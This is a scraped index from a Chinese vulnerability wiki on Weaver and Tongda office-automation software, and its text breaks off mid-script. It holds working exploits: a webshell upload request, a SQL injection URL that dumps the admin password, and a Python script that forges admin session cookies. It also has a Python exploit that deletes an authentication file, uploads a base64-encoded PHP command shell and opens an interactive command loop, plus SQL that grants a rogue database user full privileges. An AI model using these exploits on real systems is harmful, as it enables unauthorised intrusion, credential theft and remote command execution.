filename=******5308.java&filetype=javafilename为文件名称 为空时会自动创建一个 String fileid = \"Ewv\"; String readonly = \"\"; boolean isCreate = false; if(StringHelper.isEmpty(fileName)) { Date ndate = new Date(); SimpleDateFormat sf = new SimpleDateFormat(\"yyyyMMddHHmmss\"); String datetime = sf.format(ndate); fileid = fileid + datetime; fileName= fileid + \".\" + filetype; isCreate = true; } else { int pointIndex = fileName.indexOf(\".\"); if(pointIndex > -1) { fileid = fileName.substring(0,pointIndex); }} 参考文章 泛微OA未授权可导致GetShell 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微OA V9 任意文件上传.html":{"url":"book/OA产品漏洞/泛微OA/泛微OA V9 任意文件上传.html","title":"泛微OA V9 任意文件上传","keywords":"","body":"泛微OA V9 任意文件上传 漏洞描述 泛微OA V9 存在文件上传接口导致任意文件上传 漏洞影响 [!NOTE] 泛微OA V9 漏洞复现 漏洞位于: /page/exportImport/uploadOperation.jsp文件中 Jsp流程大概是:判断请求是否是multipart请求,然就没有了,直接上传了,啊哈哈哈哈哈 重点关注File file=new File(savepath+filename), Filename参数,是前台可控的,并且没有做任何过滤限制 利用非常简单,只要对着 127.0.0.1/page/exportImport/uploadOperation.jsp 来一个multipartRequest就可以,利用简单,自评高危!! 然后请求 然后请求路径: page/exportImport/fileTransfer/1.jsp 请求包 POST /page/exportImport/uploadOperation.jsp HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 397 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 dnt: 1 x-forwarded-for: 127.0.0.1 Connection: close ------WebKitFormBoundary6XgyjB6SeCArD3Hc Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\" Content-Type: application/octet-stream ------WebKitFormBoundary6XgyjB6SeCArD3Hc-- 地址: /page/exportImport/fileTransfer/test.jsp 默认密码 rebeyond 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微OA V8 SQL注入漏洞.html":{"url":"book/OA产品漏洞/泛微OA/泛微OA V8 SQL注入漏洞.html","title":"泛微OA V8 SQL注入漏洞","keywords":"","body":"泛微OA V8 SQL注入漏洞 漏洞描述 泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限 漏洞影响 [!NOTE] 泛微OA V8 FOFA [!NOTE] app=\"泛微-协同办公OA\" 漏洞复现 在getdata.jsp中，直接将request对象交给 weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : 方法处理 在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法 Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象) 在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中 根据以上代码流程，只要构造请求参数 ?cmd= getSelectAllId&sql=select password as id from userinfo; 即可完成对数据库操控 POC http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager 查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password） 解密后即可登录系统 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Weaver OA 8 SQL injection 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/":{"url":"book/OA产品漏洞/通达OA/","title":"通达OA","keywords":"","body":"通达OA 通达OA部分漏洞信息整合 通达OA v11.2 后台任意文件上传漏洞 通达OA v11.x-v11.5任意用户登录 通达OA v11.6 任意文件删除&RCE 通达OA v11.7后台SQL注入漏洞 通达OA v11.7 在线用户登录漏洞 通达OA v11.8 后台文件包含XSS漏洞 通达OA v11.8 后台文件包含命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA部分漏洞信息整合.html":{"url":"book/OA产品漏洞/通达OA/通达OA部分漏洞信息整合.html","title":"通达OA部分漏洞信息整合","keywords":"","body":"通达OA部分漏洞信息整合 通达OA信息收集 http[s]://TongDaOA.domain/inc/expired.php 判断通达版本 http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET 参数username、email 可爆用户、邮箱 http[s]://TongDaOA.domain/resque/worker.php 计算机名 2013-2017(SQLi path) http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php v11~v11.6 [0day] http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php v11.6 [RCE] http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除 参考文章 通达OA漏洞一些漏洞点(Github) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.2 后台任意文件上传漏洞.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.2 后台任意文件上传漏洞.html","title":"通达OA v11.2 后台任意文件上传漏洞","keywords":"","body":"通达OA v11.2后台任意文件上传漏洞 漏洞描述 通达OA v11.2后台存在文件上传漏洞，允许通过绕过黑名单的方法来上传恶意文件，导致服务器被攻击 影响版本 [!NOTE] 通达OA v11.2 环境搭建 通达OA v11.2下载链接 下载后按步骤安装即可 漏洞复现 该漏洞存在于后台，需要通过登录后才能进行使用 登录后点击 菜单 -> 系统管理 -> 附件管理 点击添加附录存储管理添加如下(存储目录为 webroot 目录，默认为 D:/MYOA/webroot/) 点击 组织 -> 系统管理员 -> 上传附件 抓包使用 windows 的绕过方法 shell.php -> shell.php. [!NOTE] 2012 为目录 1717872192 为拼接的文件名 最后的shell名字为 1717872192.shell.php 访问木马文件 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.html","title":"通达OA v11.x-v11.5任意用户登录","keywords":"","body":"通达OA v11.x-v11.5任意用户登录 漏洞描述 通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。 影响版本 [!NOTE] 通达OA 2017版 通达OA版本 V11.X 环境搭建 漏洞环境下载 https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe 双击安装即可 漏洞复现 使用POC获取管理员的Cookie root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ 成功获得Cookie,添加Cookie访问 http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0即可 漏洞利用POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '用户未登录' not in check_available.text: if '重新登录' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '用户未登录' not in check_available.text: if '重新登录' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11、-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.html","title":"通达OA v11.6 任意文件删除&RCE","keywords":"","body":"通达OA v11.6 任意文件删除&RCE 漏洞描述 通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传 漏洞影响 [!NOTE] 通达OA v11.6 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 使用解密工具 SeayDzend(zend解密工具) 对通达OA的加密代码进行解密 [!NOTE] 解密工具已经放在目录下的POC目录中 解密完成后查看 webroot\\general\\data_center\\utils\\upload.php 文件 \\r\\n\\r\\n\"; ?> 在第一行包含了文件 auth.inc.php include_once \"inc/auth.inc.php\"; 可以看到这个文件用于检验是否登录，未登录的情况无法利用这个漏洞 查看 \\webroot\\module\\appbuilder\\assets\\print.php文件 这里可以看到 页面获取 guid参数的值 使用file_exists函数判断文件是否存在 并未进行校验 就执行unlink删除文件 可以本地在 \\webroot\\inc 目录创建 1.txt 文件 然后访问 http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt 就会删除这个 1.txt 文件，也代表可以删除 auth.inc.php 登录检验文件 回到 upload.php 文件进行代码审计 判断变量 $action 是否为 upload，再判断文件类型，如果不为 xls 和 img 则进入else分支 else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i 在这段代码中，如果不存在 $from_rep 变量则会跳到如下代码 else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } 这里直接将 $repkid 变量进行拼接,也就是说可以通过目录穿越来上传恶意文件到指定目录 [!NOTE] 这里需要利用file_exists函数的漏洞构造/.<>./.<>./.<>./ 逃逸出来 使用POC来利用漏洞 [!NOTE] 注意在删除验证身份的文件后，会造成后台页面出现如下图，使用前备份文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA v11.6 任意文件删除&RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/module/appbuilder/assets/print.php\" try: check_url_response = requests.get(url = check_url) if check_url_response.status_code == 200: print(\"\\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除&RCE漏洞\\033[0m\") input(\"\\033[32m[o] 此漏洞会对真实环境造成影响，请在授权的情况下利用此漏洞，按下任意键继续..... \\033[0m\") else: print(\"\\033[31m[x] 不存在 /module/appbuilder/assets/print.php 漏洞利用失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try: unlink_response = requests.get(url = unlink_url) if unlink_response.status_code == 200: print(\"\\033[32m[o] 成功删除校验文件 auth.inc.php \\033[0m\") else: print(\"\\033[31m[x] 删除校验文件 auth.inc.php 失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, payload_php): \"\"\" (绕过的webshell) exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('test.php', payload_php)} try: vuln_response = requests.post(url = vuln_url,files=files) if vuln_response.status_code == 200: print(\"\\033[32m[o] 成功写入webshell文件: _test.php \\033[0m\") print(\"\\033[32m[o] webshell地址为: {}/_test.php \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 写入webshell文件失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, cmd): cmd_url = target_url + \"/_test.php?test={}\".format(cmd) try: cmd_response = requests.get(url = cmd_url) if cmd_response.status_code == 200: print(\"\\033[32m[o] 正在执行命令: {} \\033[0m\".format(cmd_url)) print(\"\\033[32m[o] 响应为: \\n{} \\033[0m\".format(cmd_response.text)) else: print(\"\\033[31m[x] 命令执行失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) POC_2(target_url) payload_php = base64.b64decode(\"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=\").decode(\"utf-8\") POC_3(target_url, payload_php) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_4(target_url, cmd) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.7 后台SQL注入.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.7 后台SQL注入.html","title":"通达OA v11.7 后台SQL注入","keywords":"","body":"通达OA v11.7后台SQL注入 漏洞描述 通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器 漏洞影响 [!NOTE] 通达OA v11.7 环境搭建 环境地址 漏洞复现 在 general/hr/manage/query/delete_cascade.php 文件中 首先判断$condition_cascade是否为空，如果不为空，则将其中的\\'替换为'。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用addslashes函数进行保护，如下： inc/common.inc.php 代码 使用盲注对SQL注入进行测试 触发了通达OA的SQL注入拦截 inc/conn.php文件中找到过滤机制如下: 其过滤了一些字符，但是并非无法绕过，盲注的核心是：substr、if等函数，均未被过滤，那么只要构造MySQL报错即可配合if函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现power(9999,99)也可以使数据库报错，所以构造语句： select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错 添加SQL数据库用户 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 访问 http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 进入 Myoa/mysql5/bin 目录 执行 mysql -upeiqi -p 输入密码查询所有用户 发现成功执行添加一个账户 然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限： UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5)); 然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;这样就拥有了所有权限 登录如果失败，执行 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 利用漏洞写shell # 查路径： select @@basedir; # F:\\OA\\mysql5\\，那么web目录就是 F:/OA/webroot/ # 方法1： set global slow_query_log=on; set global slow_query_log_file='F:/OA/webroot/'; select '' or sleep(11); # 方法2： set global general_log = on; set global general_log_file = 'F:/OA/webroot/'; select ''; show variables like '%general%'; 上传大马 参考文章 通达OA v11.7后台SQL注入到RCE[0day] 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.7 在线用户登录漏洞.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.7 在线用户登录漏洞.html","title":"通达OA v11.7 在线用户登录漏洞","keywords":"","body":"通达OA v11.7 在线用户登录漏洞 漏洞描述 通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统 漏洞影响 [!NOTE] 通达OA 环境搭建 通达OA v11.7下载链接 下载后按步骤安装即可 漏洞复现 漏洞有关文件 MYOA\\webroot\\mobile\\auth_mobi.php 在执行的 SQL语句中 $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\''; 简单阅读PHP源码可以知道 此SQL语句会查询用户是否在线，如在线返回此用户 Session ID 将返回的 Set-Cookie 中的Cookie参数值使用于登录Cookie 访问目标后台 http://xxx.xxx.xxx.xxx/general/ 当目标离线时则访问漏洞页面则会出现如下图 [!NOTE] 通过此思路可以持续发包监控此页面来获取在线用户的Cookie 漏洞利用POC [!NOTE] 5秒一次测试用户是否在线 import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: 